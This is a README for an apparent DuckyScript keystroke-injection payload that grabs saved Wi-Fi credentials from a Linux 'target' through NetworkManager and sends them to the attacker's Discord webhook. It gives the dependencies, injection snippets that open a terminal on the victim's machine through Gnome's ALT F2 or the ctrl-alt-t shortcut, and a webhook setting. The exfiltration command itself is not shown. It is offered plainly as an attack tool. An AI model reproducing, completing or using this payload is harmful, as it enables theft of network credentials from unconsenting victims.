# Exfiltrate wifi creds of a linux system to a discord webhook

This payload grabs the wifi credentials on a linux system and sens it to you with a discord webhook.

## Getting started

### Dependencies
- Linux
- Bash
- Network Manager

### Prerequisites

If your target uses Gnome, uncomment this line in the payload (uncomment by removing `REM_BLOCK` and `END_REM`:
```
REM_BLOCK
Use this if your target is using Gnome (remove REM_BLOCK and END_REM + this line)
ALT F2
DELAY 200
STRINGLN xterm
DELAY 500
END_REM
```

If your target uses a DE or WM that lets you open a terminal with ctrl-alt-t uncomment this line:
```
REM_BLOCK
Use this if your targets DE or WM has the ctrl-alt-t shortcut (remove REM_BLOCK and END_REM + this line)
CTRL-ALT t
DELAY 500
END_REM
```

## Settings
- #dc your discord webhook
